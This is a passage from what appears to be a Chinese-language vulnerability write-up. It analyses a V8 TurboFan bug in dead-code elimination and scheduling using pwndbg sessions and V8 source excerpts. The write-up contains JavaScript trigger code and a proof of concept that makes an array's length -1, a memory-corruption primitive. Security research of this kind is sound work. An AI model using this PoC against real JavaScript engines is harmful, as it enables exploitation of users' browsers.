IrOpcode::kTerminate) &#123;        DCHECK_EQ(IrOpcode::kLoop, node-&gt;opcode());        Replace(use, dead());      &#125;....................&#125;\n调试如下\nIn file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc   150         // Remember the loop exits so that we can mark their loop input dead.   151         // This has to be done after the use list iteration so that we do   152         // not mutate the use list while it is being iterated.   153         loop_exits.push_back(use);   154       &#125; else if (use-&gt;opcode() == IrOpcode::kTerminate) &#123; ► 155         DCHECK_EQ(IrOpcode::kLoop, node-&gt;opcode());   156         Replace(use, dead());   157       &#125;   158     &#125;   159     for (Node* loop_exit : loop_exits) &#123;   160       loop_exit-&gt;ReplaceInput(1, dead());pwndbg&gt; p node-&gt;inputs()[0]-&gt;id()$79 = 50pwndbg&gt; p node-&gt;inputs()[0]-&gt;opcode()$80 = v8::internal::compiler::IrOpcode::kJSCreateTypedArraypwndbg&gt; p node-&gt;inputs()[1]-&gt;id()$81 = 148pwndbg&gt; p node-&gt;inputs()[1]-&gt;opcode()$82 = v8::internal::compiler::IrOpcode::kDeadpwndbg&gt; p node-&gt;id()$83 = 82pwndbg&gt; p node-&gt;opcode()$84 = v8::internal::compiler::IrOpcode::kLoop\n与IR图对应起来，DeadCodeElimination::ReduceLoopOrMerge的规则是，如果LOOP节点的有效输入节点为1个，那么Terminate节点会被消除。尝试改造为嵌套循环\nfunction opt() &#123;   var a = new Uint8Array(10);   a[0x100000000] = 2;   async function deadcode() &#123;      const obj = &#123;&#125;;      while (1) &#123;             while (obj) &#123;                dead(beef);             &#125;      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n此时LOOP的第二个输入节点的路径上条件过于简单，将导致被优化去除，因此，我们尝试在内层循环中增加一个条件\nfunction opt() &#123;   var a = new Uint8Array(10);   a[0x100000000] = 2;   async function deadcode() &#123;      const obj = &#123;&#125;;      while (1) &#123;         if (badbeef) &#123;             while (obj) &#123;                dead(beef);             &#125;         &#125;      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n此时节点上Merge，该节点的第二个输入节点的路径也过于简单，将导致其第二个输入为dead，因此在DeadCodeElimination::ReduceLoopOrMerge中108: Merge会被替换为Inputs[0]，即更新为107: ifFalse，该路径同样后续会变成dead。尝试复杂化条件表达式\nfunction opt() &#123;   var a = new Uint8Array(10);   a[0x100000000] = 2;   async function deadcode() &#123;      const obj = &#123;&#125;;      while (1) &#123;         if (badbeef + a + b + c*d) &#123;             while (obj) &#123;                dead(beef);             &#125;         &#125;      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n这回发现Terminate节点没有生成，在inline阶段就出现了Dead节点，且整个流程依赖简单，导致后续LOOP节点的输入都无效从而被优化去除。通过实验可以发现，在DeadCode后面放置await语句，可以增加多个节点分支于LOOP节点的路径上，这样LOOP节点前期就不会被优化去掉了。\nfunction opt() &#123;   var a = new Uint8Array(10);   a[0x100000000] = 2;   async function deadcode() &#123;      const obj = &#123;&#125;;      while (1) &#123;         if (badbeef + a + b + c*d) &#123;             while (obj) &#123;                await 666;                dead(beef);             &#125;         &#125;      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n这次在LOOP的输入节点路径上，由于IfValue不会被优化掉，因此整个路径就不会被优化去除。\nIn file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc   108   DCHECK_EQ(inputs.count(), live_input_count);   109   return NoChange();   110 &#125;   111    112 Reduction DeadCodeElimination::ReduceLoopOrMerge(Node* node) &#123; ► 113   DCHECK(IrOpcode::IsMergeOpcode(node-&gt;opcode()));pwndbg&gt; p node-&gt;opcode()$217 = v8::internal::compiler::IrOpcode::kLooppwndbg&gt; p node-&gt;id()$218 = 106pwndbg&gt; p node-&gt;inputs()[0]-&gt;opcode()$219 = v8::internal::compiler::IrOpcode::kJSCreateTypedArraypwndbg&gt; p node-&gt;inputs()[1]-&gt;opcode()$220 = v8::internal::compiler::IrOpcode::kIfFalse\n同时，在TypedLowering阶段可以看到漏洞也被触发了经过EarlyOptimization，多余的Throw也被去掉了，剩下两个Throw而且可以看出，它们的effect连接着的上同一个节点Unreachable。\n修复后的情况首先了解一下Reduce过程中节点的遍历的顺序\nvoid GraphReducer::ReduceGraph() &#123; ReduceNode(graph()-&gt;end()); &#125;void GraphReducer::ReduceNode(Node* node) &#123;  DCHECK(stack_.empty());  DCHECK(revisit_.empty());  Push(node);  for (;;) &#123;    if (!stack_.empty()) &#123;      // Process the node on the top of the stack, potentially pushing more or      // popping the node off the stack.      ReduceTop();    &#125; else if (!revisit_.empty()) &#123;      // If the stack becomes empty, revisit any nodes in the revisit queue.      Node* const node = revisit_.front();      revisit_.pop();      if (state_.Get(node) == State::kRevisit) &#123;        // state can change while in queue.        Push(node);      &#125;    &#125; else &#123;..............void GraphReducer::ReduceTop() &#123;  NodeState&amp; entry = stack_.top();  Node* node = entry.node;  DCHECK_EQ(State::kOnStack, state_.Get(node));  if (node-&gt;IsDead()) return Pop();  // Node was killed while on stack.  Node::Inputs node_inputs = node-&gt;inputs();  // Recurse on an input if necessary.  int start = entry.input_index &lt; node_inputs.count() ? entry.input_index : 0;  for (int i = start; i &lt; node_inputs.count(); ++i) &#123;    Node* input = node_inputs[i];    if (input != node &amp;&amp; Recurse(input)) &#123;      entry.input_index = i + 1;      return;    &#125;  &#125;  for (int i = 0; i &lt; start; ++i) &#123;    Node* input = node_inputs[i];    if (input != node &amp;&amp; Recurse(input)) &#123;      entry.input_index = i + 1;      return;    &#125;  &#125;....................\n从算法中可以看出，遍历是从End节点开始向上进行深度优先搜索进行遍历的，然后对于不同的节点，调用不同的Reduce方法进行Reduce。这意味着LOOP节点比Terminate节点先进行Reduce，因为从End出发最左边开始必然有一条路径先到达LOOP前面分析过在Reduction DeadCodeElimination::ReduceLoopOrMerge函数中可能对Terminate节点进行消除\n&#125; else if (live_input_count == 1) &#123;  NodeVector loop_exits(zone_);  // Due to compaction above, the live input is at offset 0.  for (Node* const use : node-&gt;uses()) &#123;    if (NodeProperties::IsPhi(use)) &#123;      Replace(use, use-&gt;InputAt(0));    &#125; else if (use-&gt;opcode() == IrOpcode::kLoopExit &amp;&amp;               use-&gt;InputAt(1) == node) &#123;      // Remember the loop exits so that we can mark their loop input dead.      // This has to be done after the use list iteration so that we do      // not mutate the use list while it is being iterated.      loop_exits.push_back(use);    &#125; else if (use-&gt;opcode() == IrOpcode::kTerminate) &#123;      DCHECK_EQ(IrOpcode::kLoop, node-&gt;opcode());      Replace(use, dead());    &#125;  &#125;\n第一次遍历到LOOP时，由于LOOP的两个inputs均有效，Terminate节点不会被优化掉。当所以节点遍历完毕以后，需要考虑那些需要Revisit的节点，从栈中依次将他们取出然后进行处理，而LOOP节点则会被遍历到，因为与LOOP节点相连接的父节点发生更新(83：Merge 、112::Phi)时，LOOP节点两次被加入Revisit。而此后，169:Branch节点的condition早已经经过CommonOperatorReducer，已经判断出条件为dead节点了，将使得下一次Visit时，在DeadCodeElimination中的ReduceBranchOrSwitch把169:Branch节点消除，这将使得LOOP的第二个输入变得无效，进而会把Terminate节点给消除掉。而原漏洞中，由于把Terminate节点替换为了Throw，那么在ReduceLoopOrMerge中就没有满足use-&gt;opcode() == IrOpcode::kTerminate条件，自然也就不会消除该节点。由此，该漏洞本质上是与LOOP配套的Terminate在LOOP被消除时以另一个名的形式仍然存在于源控制流的路径上，使得控制流混乱。正常情况的流程如下，我们继续分析在EarlyOptimizationPhase阶段会使用以下几个优化\nstruct EarlyOptimizationPhase &#123;  DECL_PIPELINE_PHASE_CONSTANTS(EarlyOptimization)  void Run(PipelineData* data, Zone* temp_zone) &#123;    GraphReducer graph_reducer(temp_zone, data-&gt;graph(),                               &amp;data-&gt;info()-&gt;tick_counter(),                               data-&gt;jsgraph()-&gt;Dead());    DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),                                              data-&gt;common(), temp_zone);    SimplifiedOperatorReducer simple_reducer(&amp;graph_reducer, data-&gt;jsgraph(),                                             data-&gt;broker());    RedundancyElimination redundancy_elimination(&amp;graph_reducer, temp_zone);    ValueNumberingReducer value_numbering(temp_zone, data-&gt;graph()-&gt;zone());    MachineOperatorReducer machine_reducer(&amp;graph_reducer, data-&gt;jsgraph());    CommonOperatorReducer common_reducer(&amp;graph_reducer, data-&gt;graph(),                                         data-&gt;broker(), data-&gt;common(),                                         data-&gt;machine(), temp_zone);    AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);    AddReducer(data, &amp;graph_reducer, &amp;simple_reducer);    AddReducer(data, &amp;graph_reducer, &amp;redundancy_elimination);    AddReducer(data, &amp;graph_reducer, &amp;machine_reducer);    AddReducer(data, &amp;graph_reducer, &amp;common_reducer);    AddReducer(data, &amp;graph_reducer, &amp;value_numbering);    graph_reducer.ReduceGraph();  &#125;&#125;;\n其中114:Switch会在CommonOperatorReducer中的ReduceSwitch进行优化\nIn file: /home/hi/Desktop/v8/src/compiler/common-operator-reducer.cc   445       Node* if_value = projections[i];   446       DCHECK_EQ(IrOpcode::kIfValue, if_value-&gt;opcode());   447       const IfValueParameters&amp; p = IfValueParametersOf(if_value-&gt;op());   448       if (p.value() == mswitched.Value()) &#123;   449         matched = true; ► 450         Replace(if_value, control);   451         break;   452       &#125;   453     &#125;pwndbg&gt; p control-&gt;id()$3 = 55pwndbg&gt; p control-&gt;opcode()$4 = v8::internal::compiler::IrOpcode::kCall................   454     if (!matched) &#123;   455       Node* if_default = projections[projection_count - 1];   456       DCHECK_EQ(IrOpcode::kIfDefault, if_default-&gt;opcode());   457       Replace(if_default, control);   458     &#125; ► 459     return Replace(dead());\n这意味着分支预测成功，左分支被保留，同时114 Switch被置为Dead，那么与之相连接的其他节点会在DeadCodeElimination被去除，其中去除Throw的逻辑是\nReduction DeadCodeElimination::Reduce(Node* node) &#123;  DisallowHeapAccess no_heap_access;  switch (node-&gt;opcode()) &#123;.........................    case IrOpcode::kThrow:      return PropagateDeadControl(node);    case IrOpcode::kBranch:    case IrOpcode::kSwitch:      return ReduceBranchOrSwitch(node);    default:      return ReduceNode(node);  &#125;  UNREACHABLE();&#125;\n最终的结果如图而有漏洞的程序版本是这样的这是因为113：Throw并不属于那几个分支，不会被去掉。\nPOC分析给出的POC如下\nclass classA &#123;  constructor() &#123;    this.val = 0x4242;    this.x = 0;  &#125;&#125;class classB &#123;  constructor() &#123;    this.val = 0x4141;    this.x = &quot;AAA&quot;;  &#125;&#125;var A = new classA();var B = new classB();function opt(arg1,arg2) &#123;   if (arg2 == 666) &#123;      return 666;   &#125;   var a = new Uint8Array(10);   arg1.val = -1;   a[0x100000000] = 2;   async function deadcode() &#123;      const obj = &#123;&#125;;      while (1) &#123;         if (badbeef + a + b + c*d) &#123;             while (obj) &#123;                await 666;                dead(beef);             &#125;         &#125;      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;10000;i++) &#123;   opt(A,0);   opt(B,0);&#125;for (let i=0;i&lt;5000;i++) &#123;   opt(A,666);   opt(B,666);&#125;var arr = [1.1,2.2,3.3];opt(arr,0);print(arr.length);\n运行以后成功输出数组长度为-1，现在，我们来分析一下这个POC的原理首先通过对比bug版本与nobug版本对于同一POC的输出数据，可以发现在schedule中的代码顺序有一些不一样。其中的arg1.val = -1;所对应的中间代码理应归为基本块B7中，现在由于漏洞，使得其字节码归为了B4，而它的CheckMap的字节码被划分到B5，由于代码是按照顺序翻译下来并执行的，这就会导致arg1.val = -1;比arg1的类型检查先一步执行。现在来研究一下为什么会出现这种情况，首先在Run&lt;ComputeSchedulePhase&gt;();处下断点\nb pipeline.cc:3032\n因为这个地方对应了流程中的schedule阶段，断点后跟进，最后会来到Schedule* Scheduler::ComputeSchedule函数，其位于scheduler.cc文件中，可以看出，这就是schedule的整个流程了\nSchedule* Scheduler::ComputeSchedule(Zone* zone, Graph* graph, Flags flags,                                     TickCounter* tick_counter) &#123;  Zone* schedule_zone =      (flags &amp; Scheduler::kTempSchedule) ? zone : graph-&gt;zone();  // Reserve 10% more space for nodes if node splitting is enabled to try to  // avoid resizing the vector since that would triple its zone memory usage.  float node_hint_multiplier = (flags &amp; Scheduler::kSplitNodes) ? 1.1 : 1;  size_t node_count_hint = node_hint_multiplier * graph-&gt;NodeCount();  Schedule* schedule =      new (schedule_zone) Schedule(schedule_zone, node_count_hint);  Scheduler scheduler(zone, graph, schedule, flags, node_count_hint,                      tick_counter);  scheduler.BuildCFG();  scheduler.ComputeSpecialRPONumbering();  scheduler.GenerateDominatorTree();  scheduler.PrepareUses();  scheduler.ScheduleEarly();  scheduler.ScheduleLate();  scheduler.SealFinalSchedule();  return schedule;&#125;\n输入图：先是根据前面阶段优化好的IR图进行BuildCFG，生成控制流图。其关键算法如下，从End节点开始自底向上广度优先搜索遍历\n  void Run() &#123;    ResetDataStructures();    Queue(scheduler_-&gt;graph_-&gt;end());    while (!queue_.empty()) &#123;  // Breadth-first backwards traversal.      scheduler_-&gt;tick_counter_-&gt;DoTick();      Node* node = queue_.front();      queue_.pop();      int max = NodeProperties::PastControlIndex(node);      for (int i = NodeProperties::FirstControlIndex(node); i &lt; max; i++) &#123;        Queue(node-&gt;InputAt(i));      &#125;    &#125;    for (NodeVector::iterator i = control_.begin(); i != control_.end(); ++i) &#123;      ConnectBlocks(*i);  // Connect block to its predecessor/successors.    &#125;  &#125;.............  void Queue(Node* node) &#123;    // Mark the connected control nodes as they are queued.    if (!queued_.Get(node)) &#123;      BuildBlocks(node);      queue_.push(node);      queued_.Set(node, true);      control_.push_back(node);    &#125;  &#125;\n当遍历到节点时，就调用BuildBlocks生成基本代码块，因此我们在BuildBlocks下断点，就可以观察其遍历节点的顺序以及操作。当前遍历到End节点，使用FixNode将End节点添加到schedule_-&gt;end()这个block中\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   330       control_.push_back(node);   331     &#125;   332   &#125;   333    334   void BuildBlocks(Node* node) &#123; ► 335     switch (node-&gt;opcode()) &#123;   336       case IrOpcode::kEnd:   337         FixNode(schedule_-&gt;end(), node);   338         break;   339       case IrOpcode::kStart:   340         FixNode(schedule_-&gt;start(), node);pwndbg&gt; p node-&gt;opcode()$1 = v8::internal::compiler::IrOpcode::kEndpwndbg&gt; p node-&gt;id()$2 = 60In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   315  private:   316   friend class ScheduleLateNodeVisitor;   317   friend class Scheduler;   318    319   void FixNode(BasicBlock* block, Node* node) &#123; ► 320     schedule_-&gt;AddNode(block, node);   321     scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);   322   &#125;pwndbg&gt; p block-&gt;id()$4 = &#123;  index_ = 1&#125;\n接下来遍历到End的第一个输入节点30: Return，可以知道Return节点不属于控制流的一部分，于是忽略，同理Throw也上一样。\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   362         if (NodeProperties::IsExceptionalCall(node)) &#123;   363           BuildBlocksForSuccessors(node);   364         &#125;   365         break;   366       default: ► 367         break;pwndbg&gt; p node-&gt;id()$9 = 30pwndbg&gt; p node-&gt;opcode()$10 = v8::internal::compiler::IrOpcode::kReturn\n继续调试，后面不远处遍历到的节点是73：Call，显然这是借助了那个Terminate演变的Throw节点形成的一条路径遍历到此的，不然不可能这么快遍历到73:Call接下来遍历到23:Branch\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   350         FixNode(block, node);   351         break;   352       &#125;   353       case IrOpcode::kBranch:   354       case IrOpcode::kSwitch: ► 355         BuildBlocksForSuccessors(node);   356         break;pwndbg&gt; p node-&gt;id()$18 = 23pwndbg&gt; p node-&gt;opcode()$19 = v8::internal::compiler::IrOpcode::kBranch\n根据编译原理，Branch下的分支要划分基本块，因此这里获取了输出分支个数，并创建新的基本块\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   427   void BuildBlocksForSuccessors(Node* node) &#123;   428     size_t const successor_cnt = node-&gt;op()-&gt;ControlOutputCount();   429     Node** successors = zone_-&gt;NewArray&lt;Node*&gt;(successor_cnt);   430     NodeProperties::CollectControlProjections(node, successors, successor_cnt);   431     for (size_t index = 0; index &lt; successor_cnt; ++index) &#123; ► 432       BuildBlockForNode(successors[index]);   433     &#125;   434   &#125;   416   BasicBlock* BuildBlockForNode(Node* node) &#123;   417     BasicBlock* block = schedule_-&gt;block(node);   418     if (block == nullptr) &#123;   419       block = schedule_-&gt;NewBasicBlock(); ► 420       TRACE(&quot;Create block id:%d for #%d:%s\\n&quot;, block-&gt;id().ToInt(), node-&gt;id(),   421             node-&gt;op()-&gt;mnemonic());   422       FixNode(block, node);   423     &#125;   424     return block;   425   &#125;\n当遍历完整个图以后，基本块以及划分，现在是要连接这些基本块\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   269         Queue(node-&gt;InputAt(i));   270       &#125;   271     &#125;   272    273     for (NodeVector::iterator i = control_.begin(); i != control_.end(); ++i) &#123; ► 274       ConnectBlocks(*i);  // Connect block to its predecessor/successors.   275     &#125;   276   &#125;pwndbg&gt; p (*i)-&gt;id()$85 = 60pwndbg&gt; p (*i)-&gt;opcode()$86 = v8::internal::compiler::IrOpcode::kEnd\n仍然是从End开始，现在遍历到30:Return\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   390         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);   391         ConnectTailCall(node);   392         break;   393       case IrOpcode::kReturn:   394         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed); ► 395         ConnectReturn(node);   396         break;   397       case IrOpcode::kThrow:   398         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);   399         ConnectThrow(node);   400         break;pwndbg&gt; p node-&gt;id()$88 = 30\nConnectReturn调用FindPredecessorBlock找到自己属于的基本块，并加入其中\n  552   void ConnectReturn(Node* ret) &#123;  553     Node* return_control = NodeProperties::GetControlInput(ret);► 554     BasicBlock* return_block = FindPredecessorBlock(return_control);  555     TraceConnect(ret, return_block, nullptr);  556     schedule_-&gt;AddReturn(return_block, ret);  557   &#125;\n其中FindPredecessorBlock中不断的向上遍历，直到发现当前节点在基本块中存在\nBasicBlock* FindPredecessorBlock(Node* node) &#123;  BasicBlock* predecessor_block = nullptr;  while (true) &#123;    predecessor_block = schedule_-&gt;block(node);    if (predecessor_block != nullptr) break;    node = NodeProperties::GetControlInput(node);  &#125;  return predecessor_block;&#125;\n可以看出，这种找基本块的方法就是不断的遍历寻找当前节点的父节点的基本块。接下来是我们的主角134：Throw\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   394         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);   395         ConnectReturn(node);   396         break;   397       case IrOpcode::kThrow:   398         scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed); ► 399         ConnectThrow(node);   400         break;pwndbg&gt; p node-&gt;id()$91 = 134pwndbg&gt; p node-&gt;opcode()$92 = v8::internal::compiler::IrOpcode::kThrowIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   564   &#125;   565    566   void ConnectThrow(Node* thr) &#123;   567     Node* throw_control = NodeProperties::GetControlInput(thr);   568     BasicBlock* throw_block = FindPredecessorBlock(throw_control); ► 569     TraceConnect(thr, throw_block, nullptr);   570     schedule_-&gt;AddThrow(throw_block, thr);   571   &#125;pwndbg&gt; p throw_block-&gt;id()$93 = &#123;  index_ = 3&#125;\n它绑定在id为3的基本块中，同理，480:Throw绑定在id为4的基本块。当处理完所以的控制流节点以后，BuildCFG就完成了，接下来进入schedule的第二个阶段ComputeSpecialRPONumbering,将基本块的顺序排列好（确定顺序，哪个在前，哪个在后），然后是第三个阶段Scheduler::GenerateDominatorTree构造支配树，有了支配树，就可以确定每一个node被哪个block所支配了。最终确定每个node的所属块是在ScheduleLate流程，我们直接在此断点并跟入。主要逻辑如下\nvoid ProcessQueue(Node* root) &#123;  ZoneQueue&lt;Node*&gt;* queue = &amp;(scheduler_-&gt;schedule_queue_);  for (Node* node : root-&gt;inputs()) &#123;    // Don&#x27;t schedule coupled nodes on their own.    if (scheduler_-&gt;GetPlacement(node) == Scheduler::kCoupled) &#123;      node = NodeProperties::GetControlInput(node);    &#125;    // Test schedulability condition by looking at unscheduled use count.    if (scheduler_-&gt;GetData(node)-&gt;unscheduled_count_ != 0) continue;    queue-&gt;push(node);    do &#123;      scheduler_-&gt;tick_counter_-&gt;DoTick();      Node* const node = queue-&gt;front();      queue-&gt;pop();      VisitNode(node);    &#125; while (!queue-&gt;empty());  &#125;&#125;\n遍历节点，然后调用VisitNode，其中VisitNode源码如下\nvoid VisitNode(Node* node) &#123;    DCHECK_EQ(0, scheduler_-&gt;GetData(node)-&gt;unscheduled_count_);    // Don&#x27;t schedule nodes that are already scheduled.    if (schedule_-&gt;IsScheduled(node)) return;    DCHECK_EQ(Scheduler::kSchedulable, scheduler_-&gt;GetPlacement(node));    // Determine the dominating block for all of the uses of this node. It is    // the latest block that this node can be scheduled in.    TRACE(&quot;Scheduling #%d:%s\\n&quot;, node-&gt;id(), node-&gt;op()-&gt;mnemonic());    BasicBlock* block = GetCommonDominatorOfUses(node);..............................................    &#125; else if (scheduler_-&gt;flags_ &amp; Scheduler::kSplitNodes) &#123;      // Split the &#123;node&#125; if beneficial and return the new &#123;block&#125; for it.      block = SplitNode(block, node);    &#125;    // Schedule the node or a floating control structure.    if (IrOpcode::IsMergeOpcode(node-&gt;opcode())) &#123;      ScheduleFloatingControl(block, node);    &#125; else if (node-&gt;opcode() == IrOpcode::kFinishRegion) &#123;      ScheduleRegion(block, node);    &#125; else &#123;      ScheduleNode(block, node);    &#125;  &#125;\n可以知道这里是处理所有的节点，将节点添加到对应的基本代码块中。其中获取node的代码块的函数GetCommonDominatorOfUses源码如下\n  BasicBlock* GetCommonDominatorOfUses(Node* node) &#123;    BasicBlock* block = nullptr;    for (Edge edge : node-&gt;use_edges()) &#123;      if (!scheduler_-&gt;IsLive(edge.from())) continue;      BasicBlock* use_block = GetBlockForUse(edge);      block = block == nullptr                  ? use_block                  : use_block == nullptr                        ? block                        : BasicBlock::GetCommonDominator(block, use_block);    &#125;    return block;  &#125;  // staticBasicBlock* BasicBlock::GetCommonDominator(BasicBlock* b1, BasicBlock* b2) &#123;  while (b1 != b2) &#123;    if (b1-&gt;dominator_depth() &lt; b2-&gt;dominator_depth()) &#123;      b2 = b2-&gt;dominator();    &#125; else &#123;      b1 = b1-&gt;dominator();    &#125;  &#125;  return b1;&#125;\n其算法是遍历use节点，即当前节点的下一层的from节点，首先计算出这些节点属于哪个代码块，然后选取出这些代码块共同的父节点做为当前节点的代码块。从图中来看，Store的代码块决定链是这样的76:Store-&gt;472:Load-&gt;474:Word32Equal-&gt;475:DeoptimizeUnless-&gt;479:DeoptimizeUnless-&gt;GetCommonDominator(423:Unreachable,480:Throw)。之前已经分析过，480:Throw是划分在基本块4，而134:Throw是被划分在基本块3中。那么现在就是分析一下423:Unreachable属于哪个基本块？\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   1584       BasicBlock* use_block = GetBlockForUse(edge);   1585       block = block == nullptr   1586                   ? use_block   1587                   : use_block == nullptr   1588                         ? block ► 1589                         : BasicBlock::GetCommonDominator(block, use_block);   1590     &#125;   1591     return block;   1592   &#125;   1593 pwndbg&gt; p block-&gt;id()$25 = &#123;  index_ = 4&#125;pwndbg&gt; p use_block-&gt;id()$26 = &#123;  index_ = 3&#125;pwndbg&gt; p node-&gt;id()$27 = 423\n即寻找134和480基本块的公共块节点从图中看，也就是24所在的块调试也可以验证出块id确实为3\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   415    416   BasicBlock* BuildBlockForNode(Node* node) &#123;   417     BasicBlock* block = schedule_-&gt;block(node);   418     if (block == nullptr) &#123;   419       block = schedule_-&gt;NewBasicBlock(); ► 420       TRACE(&quot;Create block id:%d for #%d:%s\\n&quot;, block-&gt;id().ToInt(), node-&gt;id(),   421             node-&gt;op()-&gt;mnemonic());   422       FixNode(block, node);   423     &#125;   424     return block;   425   &#125;pwndbg&gt; p block-&gt;id()$32 = &#123;  index_ = 3&#125;pwndbg&gt; p node-&gt;id()$33 = 24\n因此423:Unreachable属于基本块3，而423:Unreachable又在480:Throw之上，是480:Throw公共块节点。因此，GetCommonDominator(423:Unreachable,480:Throw)返回的block的id为3，所以76:Store是被划分进基本块3的。同理，我们来分析一下469:DeoptimizeUnless这个节点，该节点是执行Stroe之前对对象类型进行检查的操作。该节点的blockID &#x3D; GetCommonDominator(470:Merge,471:EffectPhi)，其中470是一个Merge，因此其在BuildCFG阶段的BuildBlocks就已经划分，通过调试其块id为4\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   415    416   BasicBlock* BuildBlockForNode(Node* node) &#123;   417     BasicBlock* block = schedule_-&gt;block(node);   418     if (block == nullptr) &#123;   419       block = schedule_-&gt;NewBasicBlock(); ► 420       TRACE(&quot;Create block id:%d for #%d:%s\\n&quot;, block-&gt;id().ToInt(), node-&gt;id(),   421             node-&gt;op()-&gt;mnemonic());   422       FixNode(block, node);   423     &#125;   424     return block;   425   &#125;pwndbg&gt; p block-&gt;id()$35 = &#123;  index_ = 4&#125;pwndbg&gt; p node-&gt;id()$36 = 470pwndbg&gt; \n而471的blockid由76:Stroe决定，前面我们推出id为3，由于Merge和EffectPhi是两个特殊节点，因此不能用前面的方法推导其blockid，因为在GetCommonDominatorOfUses函数中调用了GetBlockForUse，而该函数对这两种节点做了特殊处理\nBasicBlock* GetBlockForUse(Edge edge) &#123;    // TODO(titzer): ignore uses from dead nodes (not visited in PrepareUses()).    // Dead uses only occur if the graph is not trimmed before scheduling.    Node* use = edge.from();    if (IrOpcode::IsPhiOpcode(use-&gt;opcode())) &#123;      .........................      // If the use is from a fixed (i.e. non-floating) phi, we use the      // predecessor block of the corresponding control input to the merge.      if (scheduler_-&gt;GetPlacement(use) == Scheduler::kFixed) &#123;        TRACE(&quot;  input@%d into a fixed phi #%d:%s\\n&quot;, edge.index(), use-&gt;id(),              use-&gt;op()-&gt;mnemonic());        Node* merge = NodeProperties::GetControlInput(use, 0);        DCHECK(IrOpcode::IsMergeOpcode(merge-&gt;opcode()));        Node* input = NodeProperties::GetControlInput(merge, edge.index());        return FindPredecessorBlock(input);      &#125;    &#125; else if (IrOpcode::IsMergeOpcode(use-&gt;opcode())) &#123;      // If the use is from a fixed (i.e. non-floating) merge, we use the      // predecessor block of the current input to the merge.      if (scheduler_-&gt;GetPlacement(use) == Scheduler::kFixed) &#123;        TRACE(&quot;  input@%d into a fixed merge #%d:%s\\n&quot;, edge.index(), use-&gt;id(),              use-&gt;op()-&gt;mnemonic());        return FindPredecessorBlock(edge.to());      &#125;    &#125;.........................\n因此，对于471，其BlockID=FindPredecessorBlock(469)\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   1615         TRACE(&quot;  input@%d into a fixed phi #%d:%s\\n&quot;, edge.index(), use-&gt;id(),   1616               use-&gt;op()-&gt;mnemonic());   1617         Node* merge = NodeProperties::GetControlInput(use, 0);   1618         DCHECK(IrOpcode::IsMergeOpcode(merge-&gt;opcode()));   1619         Node* input = NodeProperties::GetControlInput(merge, edge.index()); ► 1620         return FindPredecessorBlock(input);   1621       &#125;pwndbg&gt; p input-&gt;id()$50 = 469pwndbg&gt; p use-&gt;id()$51 = 471\n即向上查找，从图上来看，找到的就是465所处的blockID由于465是Branch的一个分支，因此它的blockID在BuildCFG阶段就确定了\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   415    416   BasicBlock* BuildBlockForNode(Node* node) &#123;   417     BasicBlock* block = schedule_-&gt;block(node);   418     if (block == nullptr) &#123;   419       block = schedule_-&gt;NewBasicBlock(); ► 420       TRACE(&quot;Create block id:%d for #%d:%s\\n&quot;, block-&gt;id().ToInt(), node-&gt;id(),   421             node-&gt;op()-&gt;mnemonic());   422       FixNode(block, node);   423     &#125;   424     return block;   425   &#125;pwndbg&gt; p block-&gt;id()$56 = &#123;  index_ = 7&#125;pwndbg&gt; p node-&gt;id()$57 = 465\n同理，对于470：Merge，也是FindPredecessorBlock(469)，返回的blockID为7\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   1623       // If the use is from a fixed (i.e. non-floating) merge, we use the   1624       // predecessor block of the current input to the merge.   1625       if (scheduler_-&gt;GetPlacement(use) == Scheduler::kFixed) &#123;   1626         TRACE(&quot;  input@%d into a fixed merge #%d:%s\\n&quot;, edge.index(), use-&gt;id(),   1627               use-&gt;op()-&gt;mnemonic()); ► 1628         return FindPredecessorBlock(edge.to());   1629       &#125;   1630     &#125;pwndbg&gt; p edge.to()-&gt;id()$60 = 469pwndbg&gt; p use-&gt;id()$61 = 470\n因此469:DeoptimizeUnless这个节点是属于基本块7的。从以上分析，可以知道ScheduleLate阶段就是在划分节点所属的基本块，在ScheduleLate流程后，接下来是SealFinalSchedule\nvoid Scheduler::SealFinalSchedule() &#123;  TRACE(&quot;--- SEAL FINAL SCHEDULE ------------------------------------\\n&quot;);  // Serialize the assembly order and reverse-post-order numbering.  special_rpo_-&gt;SerializeRPOIntoSchedule();  special_rpo_-&gt;PrintAndVerifySpecialRPO();  // Add collected nodes for basic blocks to their blocks in the right order.  int block_num = 0;  for (NodeVector* nodes : scheduled_nodes_) &#123;    BasicBlock::Id id = BasicBlock::Id::FromInt(block_num++);    BasicBlock* block = schedule_-&gt;GetBlockById(id);    if (nodes) &#123;      for (Node* node : base::Reversed(*nodes)) &#123;        schedule_-&gt;AddNode(block, node);      &#125;    &#125;  